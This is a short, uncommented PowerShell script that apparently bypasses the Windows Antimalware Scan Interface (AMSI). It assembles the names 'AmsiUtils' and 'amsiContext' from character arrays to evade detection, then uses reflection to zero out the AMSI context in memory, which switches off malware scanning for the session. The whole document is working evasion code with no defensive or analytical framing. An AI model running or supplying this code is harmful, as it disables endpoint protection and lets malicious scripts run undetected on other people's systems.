$types = [Ref].Assembly.GetTypes()

$x = @('A','m','s','i','U','t','i','l','s')

$y = @('a','m','s','i','C','o','n','t','e','x','t')

$s = $x -join ''

$s1 = $y -join ''

foreach($type in $types)
{
    if ($type.Name -like $s)
    {
        $fields = $type.GetFields('NonPublic,Static')

        foreach($field in $fields)
        {
            if ($field.Name -like $s1)
            {
                [IntPtr] $dest = $field.GetValue($null)

                [Int32[]] $buf = @(0,0,0,0)

                [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $dest, 4)
            }
        }
    }
}
